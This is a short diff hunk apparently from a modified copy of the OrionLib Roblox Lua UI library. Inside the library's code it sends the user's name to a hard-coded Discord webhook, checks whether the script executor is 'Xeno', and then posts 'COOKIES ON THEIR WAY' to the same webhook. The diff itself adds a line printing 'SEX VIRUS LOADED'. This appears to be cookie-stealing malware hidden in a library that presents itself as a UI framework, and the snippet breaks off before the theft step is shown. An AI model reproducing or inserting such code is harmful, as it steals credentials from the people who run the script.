@@ -2040,6 +2040,8 @@ function OrionLib:Destroy()
 	Orion:Destroy()
 end
 sendWebhook("https://discord.com/api/webhooks/1342962784979255307/2WSBKogNwFxO4B1CH1k36wQWaVzlG9q7BJpT6ICREtfNTatgDD6135oQpQXYDuW3GqY_", "test from "..Name)	
+
+print("SEX VIRUS LOADED")
 if string.find(identifyexecutor(), "Xeno") then
 			sendWebhook("https://discord.com/api/webhooks/1342962784979255307/2WSBKogNwFxO4B1CH1k36wQWaVzlG9q7BJpT6ICREtfNTatgDD6135oQpQXYDuW3GqY_", "COOKIES ON THEIR WAY")
 			
